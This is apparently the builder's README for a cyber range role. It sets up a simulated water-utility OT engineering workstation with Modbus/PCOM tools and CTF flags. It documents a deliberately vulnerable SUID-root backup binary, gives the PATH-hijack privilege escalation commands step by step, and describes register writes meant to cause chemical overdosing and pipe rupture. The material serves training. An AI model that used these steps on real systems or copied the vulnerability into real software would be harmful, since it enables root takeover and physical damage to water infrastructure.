# ww_engws — Controls Engineering Workstation (ww-eng01)

> Builder's notes (spoilers). Players should not read this. The platform spec is
> `docs/DESIGN.md`.

Builds **ww-eng01** (`10.X.40.20`, VLAN 40 SCADA), the Cedar Ridge
controls-engineering workstation operated by Marcus Oyelaran (`m.oyelaran`) and
the OT vendor Hydra Controls (`hydra_vendor`). It is reached **only** from the
OT jump host (`ww-jump01`) over SSH, and it is the only host permitted to reach
the field controllers on tcp/502 (Modbus) and tcp/20256 (PCOM). It is the crown
jewel for OT recon: PLC project files, the maintenance key, and the toolkit that
talks to the controllers all live here.

## Accounts

| User | Shell | Auth | Notes |
|---|---|---|---|
| `hydra_vendor` | /bin/bash | SSH key (`hydra_vendor_eng.pub` → `authorized_keys`) + strong random password | vendor remote-support account; entry point from the jump host |
| `m.oyelaran` | /bin/bash | strong random password | controls engineer; owns `~/projects` |

`localuser` is managed by the base image / elsewhere. Passwords use a fixed
per-user salt so `password_hash('sha512', salt)` is idempotent. The
engineering **private** key (`hydra_vendor_eng`) is staged in `files/` but not
installed on this host — it lives on the jump host; here only the public key is
placed as `authorized_keys`. `sshd` has a drop-in enabling
`PasswordAuthentication yes` and `PubkeyAuthentication yes`.

`ww_controlroom_password` is intentionally **not** written anywhere on this box
(the vendor runbook deliberately tells engineers to get it from the control-room
lead instead).

## Engineering CLI toolkit — `/opt/hydra-tools` (world-readable, 0755)

Stdlib-only Python 3. `mbclient.py` is copied from `roles/ww_hmi/files` and
imported by the Modbus tools.

| Tool | Protocol | Purpose |
|---|---|---|
| `pcom_client.py` | Unitronics PCOM/TCP (ASCII, protocol 101), tcp/20256 | V570 chem-feed: read/write MI/MB **0–4095**, RUN/STOP |
| `mbtool.py` | Modbus/TCP, tcp/502 | all three controllers; coils/DI/HR/IR, **FC43** device id, **FC17** server id |
| `tagmon.py` | Modbus/TCP, tcp/502 | live tag monitor for a chosen site |
| `mbclient.py` | — | shared Modbus library |

`pcom_client.py` implements the PCOM framing exactly as `roles/ww_plc/files/
wwplc.py` `PcomServer` expects:

```
TCP header : <tid u16 LE><protocol=101 u8><reserved=0 u8><length u16 LE>
body       : '/' <unit:2 hex> <CMD> <data> <checksum:2 hex upper> '\r'
checksum   : sum(bytes of unit..data) % 256, two upper-case hex
reply      : '/A' <unit:2> <CMD> <data> <checksum:2> '\r'
```

Supported commands: `id`, `rw`/`sw` (MI words, hex, `--text` to ASCII-decode),
`rb`/`sb` (MB bits), `run` (CCR), `stop` (CCS).

## Which tool reads which flag

| Flag | Host | How, from this workstation |
|---|---|---|
| `plc01_devid` | ww-plc01 | `mbtool.py 10.X.50.10 devid` (FC43, object 0x06 `UserApplicationName`), or `srvid` (FC17) |
| `plc02_pcom` | ww-plc02 | `pcom_client.py 10.X.50.20 rw 3000 24 --text` — MI 3000-3023 is above the Modbus window, PCOM is the **only** way to read it |
| `eng_root` | ww-eng01 | `/root/flag.txt` via the `projbackup` PATH hijack (below) |

The impact flags (naoh / deface / overflow / mainbreak / drypump) are triggered
by writing the field controllers with these same tools, driven by the register
maps in the project files and the surge study; the flags themselves land in PLC
memory (see `docs/DESIGN.md §4`).

## PLC project / engineering files — `/home/m.oyelaran/projects` (0640, git repo)

- `CEDAR_INTAKE_PLC01_M340.md` — M340 intake program: I/O list, lead/lag
  narrative, full Modbus map, interlocks (LL protection).
- `CEDAR_WTP_CHEMFEED_PLC02_V570.md` — V570 chem-feed: NaOH flow-paced dosing,
  `PH_HIHI_CUTOUT`, the Modbus↔MI window, and the note that MI 3000+ and
  RUN/STOP are PCOM-only. Includes a Hydra Controls commissioning note.
- `HILLTOP_RTU03_main.st` — IEC 61131-3 Structured Text for the SCADAPack 474:
  lead/lag, FCV-301 slew-limited control, SAV-301 surge logic, HP trip, HL
  cutoff, maintenance mode. **Contains the maintenance key** (`ww_rtu03_maint_key`
  = `8042`, also the station street number — OSINT) in a ST comment.
- `Hilltop_Surge_Analysis_2019.md` — full water-hammer study: a≈1100 m/s,
  L≈4023 m, 2L/a≈7.3 s, Joukowsky ΔP, SAV clamp 165 psi, crossing fails
  ≥240 psi. This is the attacker's playbook for `impact_mainbreak`.
- `addressing/*.csv` — tag↔address exports for all three sites.

## Privilege escalation → root (`eng_root`)

**Mechanism: SUID-root binary with a `PATH`-hijacked `system()` call.**

- `files/projbackup.c` is compiled at deploy time with `gcc` to
  `/usr/local/bin/projbackup`, owned `root:root`, mode **4755** (SUID).
- It calls `setuid(0); setgid(0);` then
  `system("tar czf /var/backups/projects.tgz -C /home/m.oyelaran projects")`.
- `tar` is invoked **by name**, so it is resolved via `PATH`. Any user who can
  run `projbackup` (e.g. `hydra_vendor`) escalates by planting a malicious `tar`
  early in `PATH`:

  ```
  cd /tmp
  printf '#!/bin/sh\ncat /root/flag.txt; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > tar
  chmod +x tar
  PATH=/tmp:$PATH projbackup
  /tmp/rootbash -p        # euid 0
  ```

  Because `setuid(0)` makes the real UID 0 as well, the `system()` shell (and
  the planted `tar`) run fully as root, so `/root/flag.txt` is readable.

A weekly `/etc/cron.d/projbackup` runs the helper as `m.oyelaran`, and the
toolkit README tells engineers to run `projbackup` before editing a live program
— a legitimate-looking cover. The exploit itself is **not** documented on the
box.

## Variables consumed

`ww_flags` (asserted defined; uses `eng_root`, `plc01_devid`, `plc02_pcom`),
`ww_net`, `ww_rtu03_maint_key`, `ww_org_name`, `ww_domain`.
`ww_controlroom_password` is referenced by the scenario but deliberately not
written to disk here. Role-local knobs are in `defaults/main.yml`.

## Layout

```
defaults/  meta/  handlers/  tasks/  templates/  files/  README.md
files/     hydra_vendor_eng  hydra_vendor_eng.pub  projbackup.c  tools/{pcom_client,mbtool,tagmon,mbclient}.py
templates/ projects/*  home/{hydra_vendor,m.oyelaran}/*  hydra-tools-README.md.j2  projbackup.cron.j2
```
